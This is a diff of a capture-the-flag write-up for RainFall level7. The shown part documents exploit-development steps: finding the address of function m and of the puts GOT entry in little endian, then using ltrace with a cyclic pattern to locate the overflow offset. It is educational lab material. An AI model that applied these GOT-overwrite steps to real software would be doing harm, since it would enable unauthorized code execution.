@@ -20,7 +20,8 @@ level7@RainFall:~$ objdump -t level7
 08049940 g       *ABS*  00000000              __bss_start
 ...
 ```
-`m` in little endian : \xf4\x84\x04\x08
+Address of `m` : `080484f4`
+In little endian : `\xf4\x84\x04\x08`
 
 - address of `puts` (in the GOT) : 
 
@@ -42,9 +43,10 @@ OFFSET   TYPE              VALUE
 08049930 R_386_JUMP_SLOT   __libc_start_main
 08049934 R_386_JUMP_SLOT   fopen
 ```
-in little endian : \x28\x99\x04\x08
+Address of `puts` : `08049928`
+In little endian : `\x28\x99\x04\x08`
 
-Now let's find the last thing (the offset). For this we will use ltrace with a [pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator) and check what do we have at the second `strcpy` destination:
+Now let's find the last thing (the offset). For this we will use `ltrace` with a [pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator) and check what do we have at the second `strcpy` destination:
 ```Shell
 level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag AAAA
 __libc_start_main(0x8048521, 3, 0xbffff724, 0x8048610, 0x8048680 <unfinished ...>
